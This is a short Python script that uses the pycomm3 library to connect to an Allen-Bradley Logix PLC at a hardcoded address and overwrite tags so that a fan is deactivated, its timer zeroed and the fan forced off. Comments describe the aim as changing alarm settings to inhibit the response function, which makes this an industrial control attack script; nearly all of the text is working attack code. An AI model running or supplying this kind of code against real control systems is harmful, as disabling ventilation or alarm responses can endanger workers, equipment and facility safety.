from pycomm3 import LogixDriver
import socket

def find_plc_ip():
    # Implement a method to find the PLC's IP address
    # This could be done via network scanning, known IP range, or other methods
    # For simplicity, we'll assume the IP is known or provided
    plc_ip = "192.168.1.10"  # Replace with the actual PLC IP address
    return plc_ip

def modify_alarm_settings(plc_ip):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            # Read the current alarm settings
            current_alarm_settings = plc.read('Activate_FanA', 'FanA_Timer', 'FanA_Off')

            # Modify the alarm settings to inhibit the response function
            # Example: Disable the fan activation by setting Activate_FanA to FALSE
            plc.write(('Activate_FanA', False))

            # Optionally, modify other alarm-related tags
            plc.write(('FanA_Timer', 0))  # Reset the timer
            plc.write(('FanA_Off', True))  # Force the fan off

            print("Alarm settings modified successfully.")

    except Exception as e:
        print(f"Error modifying alarm settings: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"Found PLC at IP: {plc_ip}")

        # Step 2: Modify the alarm settings
        modify_alarm_settings(plc_ip)
    else:
        print("Could not find PLC IP address.")